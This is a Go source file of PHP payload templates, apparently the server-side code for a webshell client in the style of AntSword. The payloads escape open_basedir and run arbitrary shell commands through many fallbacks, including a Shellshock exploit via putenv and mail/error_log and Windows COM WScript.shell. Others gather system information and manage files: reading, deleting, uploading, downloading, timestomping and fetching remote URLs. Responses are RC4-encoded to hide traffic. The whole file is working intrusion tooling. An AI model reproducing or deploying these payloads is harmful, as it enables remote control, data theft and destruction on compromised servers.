package template

//执行脚本模版，传入随机数和执行的脚本
var PhpTmp  =`@ini_set("display_errors", "0");
@set_time_limit(0);
$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split("/;|:/", $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());
    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        };
        $tmdir = $item . "/.a07a37ef45c";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        };
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    };
};;
function asenc($out)
{
    return $out;
}

;
function asoutput()
{
	$random = "%v";
    $output = ob_get_contents();
    ob_end_clean();
	$resultold=$random.base64_encode($output);
    $resultnew=rc4Base64Encode($random,$resultold);
    echo @asenc($resultnew);
}

function rc4Base64Encode($pwd, $data)
{
    $cipher      = '';
    $key[]       = "";
    $box[]       = "";
    $pwd_length  = strlen($pwd);
    $data_length = strlen($data);
    for ($i = 0; $i < 256; $i++) {
        $key[$i] = ord($pwd[$i %% $pwd_length]);
        $box[$i] = $i;
    }
    for ($j = $i = 0; $i < 256; $i++) {
        $j       = ($j + $box[$i] + $key[$i]) %% 256;
        $tmp     = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for ($a = $j = $i = 0; $i < $data_length; $i++) {
        $a       = ($a + 1) %% 256;
        $j       = ($j + $box[$a]) %% 256;
        $tmp     = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $k       = $box[(($box[$a] + $box[$j]) %% 256)];
        $cipher .= chr(ord($data[$i]) ^ $k);
    }
    return base64_encode($cipher);
}


ob_start();
try {	
	%s
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
};
asoutput();
die();`

//执行命令模版，需要传入命令和使用的shell
var PhpTerminal =`$p = base64_decode("%v");
    $s = base64_decode("%v");
    $envstr = @base64_decode("");
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
    if (substr($d, 0, 1) == "/") {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    } else {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
    }
    if (!empty($envstr)) {
        $envarr = explode("|||asline|||", $envstr);
        foreach ($envarr as $v) {
            if (!empty($v)) {
                @putenv(str_replace("|||askey|||", "=", $v));
            }
        }
    }
    $r = "{$p} {$c}";
    function fe($f)
    {
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return (function_exists($f) && is_callable($f) && !in_array($f, $d));
    }

    ;
    function runshellshock($d, $c)
    {
        if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {
            if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
                $tmp = tempnam(sys_get_temp_dir(), 'as');
                putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
                if (fe('error_log')) {
                    error_log("a", 1);
                } else {
                    mail("a@127.0.0.1", "", "", "-bv");
                }
            } else {
                return False;
            }
            $output = @file_get_contents($tmp);
            @unlink($tmp);
            if ($output != "") {
                print($output);
                return True;
            }
        }
        return False;
    }

    ;
    function runcmd($c)
    {
        $ret = 0;
        $d = dirname($_SERVER["SCRIPT_FILENAME"]);
        if (fe('system')) {
            @system($c, $ret);
        } elseif (fe('passthru')) {
            @passthru($c, $ret);
        } elseif (fe('shell_exec')) {
            print(@shell_exec($c));
        } elseif (fe('exec')) {
            @exec($c, $o, $ret);
            print(join("
", $o));
        } elseif (fe('popen')) {
            $fp = @popen($c, 'r');
            while (!@feof($fp)) {
                print(@fgets($fp, 2048));
            }
            @pclose($fp);
        } elseif (fe('proc_open')) {
            $p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
            while (!@feof($io[1])) {
                print(@fgets($io[1], 2048));
            }
            while (!@feof($io[2])) {
                print(@fgets($io[2], 2048));
            }
            @fclose($io[1]);
            @fclose($io[2]);
            @proc_close($p);
        } elseif (fe('antsystem')) {
            @antsystem($c);
        } elseif (runshellshock($d, $c)) {
            return $ret;
        } elseif (substr($d, 0, 1) != "/" && @class_exists("COM")) {
            $w = new COM('WScript.shell');
            $e = $w->exec($c);
            $so = $e->StdOut();
            $ret .= $so->ReadAll();
            $se = $e->StdErr();
            $ret .= $se->ReadAll();
            print($ret);
        } else {
            $ret = 127;
        }
        return $ret;
    }

    ;
    $ret = @runcmd($r . " 2>&1");
    print ($ret != 0) ? "ret={$ret}" : "";;`

//获取基本信息模版
var PhpBaseInfo = `$D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $R = "{$D}\n";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $R .= "{$L}:";
    } else {
        $R .= "/";
    }
    $R .= "\n";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "\n";
    $R .= "{$s}";
    echo $R;;`

//文件管理dir模版,需要传入目录
var PhpFileManagnerDir = `$D = base64_decode("%v");
	if (substr($D,-1)!="/"){
        $D=$D."/";
    }
    $F = @opendir($D);
    if ($F == NULL) {
        echo("ERROR:// Path Not Found Or No Pemission!");
    } else {
        $M = NULL;
        $L = NULL;
        while ($N = @readdir($F)) {
            $P = $D . $N;
            $T = @date("Y-m-d H:i:s", @filemtime($P));
            @$E = substr(base_convert(@fileperms($P), 10, 8), -4);
            $R = "\t" . $T . "\t" . @filesize($P) . "\t" . $E . "\n";
            if (@is_dir($P)) $M .= $N . "/" . $R; else $L .= $N . $R;
        }
        echo $M . $L;
        @closedir($F);
    };`

//文件管理删除文件模版，需要传入文件或目录,成功返回1，不成功返回0
var PhpFileManagnerDelete = `function df($p)
    {
        $m = @dir($p);
        while (@$f = $m->read()) {
            $pf = $p . "/" . $f;
            if ((is_dir($pf)) && ($f != ".") && ($f != "..")) {
                @chmod($pf, 0777);
                df($pf);
            }
            if (is_file($pf)) {
                @chmod($pf, 0777);
                @unlink($pf);
            }
        }
        $m->close();
        @chmod($p, 0777);
        return @rmdir($p);
    }

    $F = base64_decode("%v");
    if (is_dir($F)) echo(df($F)); else {
        echo(file_exists($F) ? @unlink($F) ? "1" : "0" : "0");
    };`

//文件管理创建文件夹模版，需要传入要新建的绝对目录，成功返回1不成功返回0
var PhpFileManagerMkdir = `$f = base64_decode("%v");
    echo(mkdir($f) ? "1" : "0");;`

//修改文件时间，需要传入文件名和时间格式"2021-03-10 07:16:42",成功返回1不成功返回0
var PhpFileManagerTime = `$FN =base64_decode("%v");
    $TM = strtotime(base64_decode("%v"));
    if (file_exists($FN)) {
        echo(@touch($FN, $TM, $TM) ? "1" : "0");
    } else {
        echo("0");
    };;`

//修改文件权限，需要传入文件或者文件夹名，和权限，成功返回1不成功返回0
var PhpFileManagerMode = ` $FN =base64_decode("%v");
    $mode =base64_decode("%v");
    echo(chmod($FN, octdec($mode)) ? "1" : "0");;`

//文件重命名，需要传入该之前的文件名和改之后的文件名，成功返回1不成功返回0
var PhpFileManagerRename = `$src =base64_decode("%v");
    $dst =base64_decode("%v");
    echo(rename($src, $dst) ? "1" : "0");;`

//复制文件，需要传入原文件或者目录名和目标文件和目录名，成功返回1不成功返回0
var PhpFileManagerCopyfile = `$fc = base64_decode("%v");
    $fp =base64_decode("%v");
    function xcopy($src, $dest)
    {
        if (is_file($src)) {
            if (!copy($src, $dest)) return false; else return true;
        }
        $m = @dir($src);
        if (!is_dir($dest)) if (!@mkdir($dest)) return false;
        while ($f = $m->read()) {
            $isrc = $src . chr(47) . $f;
            $idest = $dest . chr(47) . $f;
            if ((is_dir($isrc)) && ($f != chr(46)) && ($f != chr(46) . chr(46))) {
                if (!xcopy($isrc, $idest)) return false;
            } else if (is_file($isrc)) {
                if (!copy($isrc, $idest)) return false;
            }
        }
        return true;
    }

    echo(xcopy($fc, $fp) ? "1" : "0");;`

//新建文件,需要传入两个参数，一个是文件名，一个是文件的内容
var PhpFileManagerCreateFile= `echo @fwrite(fopen(base64_decode("%v"), "w"), base64_decode("%v")) ? "1" : "0";;`

//查看文件，需要只需要传入要查看的文件名
var PhpFileManagerReadFile = `$F = base64_decode("%v");
    $P = @fopen($F, "r");
    echo(@fread($P, filesize($F) ? filesize($F) : 4096));
    @fclose($P);;`

//wget下载文件，需要传入要下载url和本地的完整文件名,和copy类似，只不过源文件变成url
var PhpFileManagerWgetFile = `    $fR = base64_decode("%v");
    $fL = base64_decode("%v");
    $F = @fopen($fR, chr(114));
    $L = @fopen($fL, chr(119));
    if ($F && $L) {
        while (!feof($F)) @fwrite($L, @fgetc($F));
        @fclose($F);
        @fclose($L);
        echo("1");
    } else {
        echo("0");
    };;`

// 下载文件模版，由于是一次读取所有文件内容到内存中，所以有文件长度限制128m，但是实际上不到128m
var PhpFileManagerDownLoad = `$F =  base64_decode("%v");
    $fp = @fopen($F, "r");
    if (@fgetc($fp)) {
        @fclose($fp);
        @readfile($F);
    } else {
        echo("ERROR:// Can Not Read");
    };`

//上传文件模版，分段上传，需要提供目标文件名，文件内容（base46编码的文件内容），php脚本中会把url数据解码追加到文件中
var PhpFileManagerUpload = `$f = base64_decode("%v");
    $c =base64_decode($_POST["data"]);
    echo(@fwrite(fopen($f, "a"), $c) ? "1" : "0");;`